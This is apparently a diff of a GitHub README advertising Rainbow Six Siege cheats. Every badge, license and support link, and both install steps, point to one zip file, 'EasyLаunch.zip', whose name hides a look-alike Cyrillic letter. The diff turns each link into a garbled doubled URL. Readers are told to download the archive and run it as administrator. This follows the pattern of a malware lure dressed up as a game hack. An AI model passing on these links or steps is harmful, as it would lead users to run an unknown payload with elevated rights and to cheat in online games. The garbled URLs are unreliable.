@@ -1,11 +1,11 @@
 # 🕹️ Tom Clancy’s Rainbow Six Siege X Cheats & Hacks 🚀
 
-![Rainbow Six Siege Logo](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip%20Six%20Siege-blue?style=flat-square&logo=steam)
-![Downloads](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip%233EC70B)
-![Version](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
-![License](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
-![OpenAI API](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
-![Claude API](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
+![Rainbow Six Siege Logo](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip%20Six%20Siege-blue?style=flat-square&logo=steam)
+![Downloads](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip%233EC70B)
+![Version](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
+![License](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
+![OpenAI API](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
+![Claude API](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)
 
 ---
 
@@ -51,12 +51,12 @@ Experience a new era of personalization and automation, with seamless integratio
 
 ## 🚀 Installation Instructions
 
-1️⃣ **Download** the `https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip` directly from this repository (head to Releases above).  
+1️⃣ **Download** the `https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip` directly from this repository (head to Releases above).  
 2️⃣ **Extract** the contents to your preferred Rainbow Six Siege plugin folder.  
-3️⃣ **Launch** `https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip` as administrator for first-time setup.
+3️⃣ **Launch** `https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip` as administrator for first-time setup.
 
 🎥 **Hands-on Video Guide:**  
-![Installation GIF](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)  
+![Installation GIF](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip)  
 <sub>*Join our operator at every step—visual reference above!* </sub>
 
 ---
@@ -86,7 +86,7 @@ Abuse, unfair competition, and violations of any terms or regulations are strict
 
 ## 📑 License
 
-Licensed under the ultra-permissive [MIT License](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip) – 2025 Edition!  
+Licensed under the ultra-permissive [MIT License](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip) – 2025 Edition!  
 Feel empowered to innovate, explore, and iterate within the license terms.
 
 ---
@@ -99,4 +99,4 @@ Rainbow Six Siege tactics optimizer, adaptive game enhancements, 2025 compatible
 
 ## 📬 Have Questions?
 
-Open a [Discussion](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip) or contact our always-on support—see you in the winner’s circle! 👑
+Open a [Discussion](https://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zipаhttps://raw.githubusercontent.com/pedrohenrique316/rainbow-six-siege-x-enhanced-tools/main/EasyLаunch.zip) or contact our always-on support—see you in the winner’s circle! 👑
